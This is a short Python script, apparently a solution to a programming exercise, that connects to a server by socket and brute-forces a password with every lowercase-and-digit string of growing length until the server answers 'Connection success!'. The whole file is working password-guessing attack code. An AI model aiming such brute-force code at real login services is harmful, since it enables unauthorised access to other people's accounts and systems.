import itertools
import socket
import string
import sys


class PasswordHacker:
    def __init__(self, ip, port):
        self.address = (ip, int(port))
        self.client = None

    def get_data(self):
        with socket.socket() as self.client:
            self.client.connect(self.address)
            return self.force_crack()

    def force_crack(self):
        letters = string.ascii_lowercase + string.digits
        n_letters = 0
        while True:
            n_letters += 1
            for password in itertools.product(letters, repeat=n_letters):
                password = ''.join(password)
                self.client.send(password.encode())
                if self.client.recv(1024).decode() == 'Connection success!':
                    return password


def main():
    hacker = PasswordHacker(*sys.argv[1:])
    print(hacker.get_data())


if __name__ == '__main__':
    main()
